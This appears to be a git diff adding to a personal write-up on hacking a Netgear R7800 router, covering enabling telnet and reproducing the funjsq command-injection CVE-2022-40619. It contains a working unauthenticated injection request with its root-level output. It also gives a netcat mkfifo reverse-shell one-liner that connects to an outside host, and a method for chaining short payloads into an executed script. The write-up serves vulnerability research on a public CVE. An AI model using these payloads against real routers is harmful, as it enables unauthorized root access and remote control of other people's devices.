@@ -217,3 +217,78 @@ root@R7800:~/etc/crontabs# cat root
 0 2 * * * 11k_scan &
 -25 02 * * * streamboost update_fmn; streamboost auto_upload; streamboost auto_update && streamboost restart
 ```
+
+# Enabling Telnet
+I spent awhile trying to figure out how to get the telnet binary to run on boot, and didn't have any luck. While researching, I found that the version of firmware on my router supports a special debugging page. On the debugging page, you can simply enable telnet:
+
+
+# Recreating CVE-2022-40619
+While checking out the filesystem, I found a folder named _funjsq_
+```
+root@R7800:/data/funjsq/bin# ls
+FYdaemon         funjsq_conntime  funjsq_dns       funjsq_redis
+funjsq.sh        funjsq_ctl       funjsq_httpd     funjsq_time.sh
+funjsq_cli       funjsq_daemon    funjsq_inetd
+funjsq_config    funjsq_detect    funjsq_nslookup
+```
+I googled funjsq trying to figure out what it was and found the following article, describing the software and a CVE for unauthenticated command injection
+https://www.onekey.com/resource/security-advisory-netgear-routers-funjsq-vulnerabilities
+
+I tried out the basic proof of concept from the article, and it works as expected:
+**HTTP Request**
+```
+GET /apply_bind.cgi?action_mode=funjsq_bind&funjsq_access_token=e594ff4c36742acf006cdf16%27|id>a|%27 HTTP/1.1
+Host: 192.168.1.1:12300
+Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+```
+**HTTP Response**
+```
+HTTP/1.0 200 Ok
+Server: funjsq_httpd
+Date: Fri, 28 Feb 2025 17:56:40 GMT
+X-UA-Compatible: IE=EmulateIE7
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html
+Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, AccessToken
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Max-Age: 3600
+Connection: close
+
+{
+   "code": 1000,
+     "msg":"bind success"
+}
+```
+File created on the routers / directory:
+```
+root@R7800:/# pwd
+/
+root@R7800:/# cat a 
+uid=0(root) gid=0(root)
+```
+
+This was cool, and I wondered if I could create a PoC to get a reverse shell. I ran into a few challanges. First the version of nc included on the Netgear's busybox, does not support the _-e_ flag. However, using you can still use netcat to get a reverse shell with this oneliner:
+'''
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+'''
+source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+The next issue I ran into was length. Because the payload is appended to the access key, you can only send about 25 characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. There may be a better way but I was able to get this to work.
+
+
